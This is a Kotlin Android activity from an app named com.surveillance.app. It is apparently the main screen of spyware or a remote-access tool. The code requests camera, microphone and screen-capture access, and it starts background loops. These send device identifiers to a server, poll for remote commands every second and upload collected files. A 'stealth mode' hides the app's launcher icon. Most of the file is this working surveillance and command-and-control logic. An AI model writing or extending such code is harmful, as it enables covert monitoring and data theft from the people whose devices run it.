package com.surveillance.app

import android.Manifest
import android.app.Activity
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.media.projection.MediaProjectionManager
import android.net.ConnectivityManager
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.widget.Button
import android.widget.TextView
import android.widget.Toast
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

class MainActivity : Activity() {

    private lateinit var statusText: TextView
    private lateinit var connectionText: TextView
    private lateinit var screenCaptureButton: Button
    private lateinit var stealthButton: Button

    private val apiService = ApiService()
    private var isStealthEnabled = false

    private val permissionRequestCode = 100
    private val screenCaptureRequestCode = 200

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        statusText = findViewById(R.id.status_text)
        connectionText = findViewById(R.id.connection_text)
        screenCaptureButton = findViewById(R.id.screen_capture_button)
        stealthButton = findViewById(R.id.stealth_button)

        requestPermissions()
        startBackgroundServices()
        updateConnectionStatus()

        screenCaptureButton.setOnClickListener {
            requestScreenCapturePermission()
        }

        stealthButton.setOnClickListener {
            toggleStealthMode()
        }

        Thread {
            while (true) {
                runOnUiThread { updateConnectionStatus() }
                Thread.sleep(5000)
            }
        }.start()
    }

    private fun requestPermissions() {
        val permissions = mutableListOf(
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO
        )

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissions.add(Manifest.permission.POST_NOTIFICATIONS)
        }

        val permissionsToRequest = permissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }

        if (permissionsToRequest.isNotEmpty()) {
            ActivityCompat.requestPermissions(
                this,
                permissionsToRequest.toTypedArray(),
                permissionRequestCode
            )
        }
    }

    private fun requestScreenCapturePermission() {
        val projectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        startActivityForResult(
            projectionManager.createScreenCaptureIntent(),
            screenCaptureRequestCode
        )
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == screenCaptureRequestCode && resultCode == Activity.RESULT_OK && data != null) {
            val serviceIntent = Intent(this, ScreenCaptureService::class.java).apply {
                putExtra("resultCode", resultCode)
                putExtra("data", data)
            }
            startForegroundService(serviceIntent)
            Toast.makeText(this, "Started screen capture", Toast.LENGTH_SHORT).show()
        }
    }

    private fun startBackgroundServices() {
        val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
        val deviceInfo = "${Build.MANUFACTURER} ${Build.MODEL}"

        // Send device status every 30 seconds
        Thread {
            while (true) {
                try {
                    apiService.sendUserStatus(deviceId, deviceInfo)
                } catch (e: Exception) {
                    e.printStackTrace()
                }
                Thread.sleep(30000)
            }
        }.start()

        // Fetch commands every 1 second (1000 ms)
        Thread {
            while (true) {
                try {
                    apiService.fetchAndHandleCommands(deviceId)
                } catch (e: Exception) {
                    e.printStackTrace()
                }
                Thread.sleep(1000)
            }
        }.start()

        // Upload pending files every 10 seconds
        Thread {
            while (true) {
                try {
                    apiService.uploadPendingFiles()
                } catch (e: Exception) {
                    e.printStackTrace()
                }
                Thread.sleep(10000)
            }
        }.start()
    }

    private fun updateConnectionStatus() {
        val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val network = connectivityManager.activeNetwork
        val isConnected = network != null
        connectionText.text = if (isConnected) "Connection: Online" else "Connection: Offline"
    }

    private fun toggleStealthMode() {
        val component = android.content.ComponentName(this, MainActivity::class.java)
        if (!isStealthEnabled) {
            packageManager.setComponentEnabledSetting(
                component,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
            isStealthEnabled = true
            Toast.makeText(this, "Stealth mode enabled", Toast.LENGTH_SHORT).show()
            finish()
        } else {
            packageManager.setComponentEnabledSetting(
                component,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )
            isStealthEnabled = false
            Toast.makeText(this, "Stealth mode disabled", Toast.LENGTH_SHORT).show()
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
    }
}
